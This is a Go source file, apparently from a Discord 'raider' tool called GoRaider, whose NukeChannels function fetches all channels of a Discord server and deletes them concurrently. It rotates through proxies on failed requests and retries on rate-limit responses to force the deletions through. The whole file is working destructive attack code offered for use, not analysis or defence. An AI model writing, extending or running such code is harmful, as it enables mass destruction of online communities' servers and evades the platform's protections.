package api

import (
	"fmt"
	"sync"

	"github.com/goodwitchh/GoRaider/tree/main/utils"
)

func deleteChannel(channelID string, wg *sync.WaitGroup) {
	defer wg.Done()

	if len(proxies) <= channelProxy {
		channelProxy = 1
	}

	_, stat := utils.SendRequest("DELETE", fmt.Sprintf("https://discord.com/api/v8/channels/%s", channelID), "application/json", proxies[channelProxy], nil)

	switch {
	case stat == 0:
		channelProxy++ // our proxy didn't like us... sad.
		wg.Add(1)
		deleteChannel(channelID, wg)

	case stat == 200:
		channelsDeleted++

	case stat == 429:
		wg.Add(1)
		deleteChannel(channelID, wg)

	}
}

func deleteChannels(array []string) {
	wg := new(sync.WaitGroup)
	for _, channel := range array {
		if len(channel) == 0 {
			continue
		}
		wg.Add(1)
		go deleteChannel(channel, wg)
	}
	wg.Wait()
}

func NukeChannels() {
	_, array := utils.GetData("https://discord.com/api/v8/guilds/%s/channels", "id")
	deleteChannels(array)
}

var (
	channelProxy    int = 1
	channelsDeleted int = 0
)
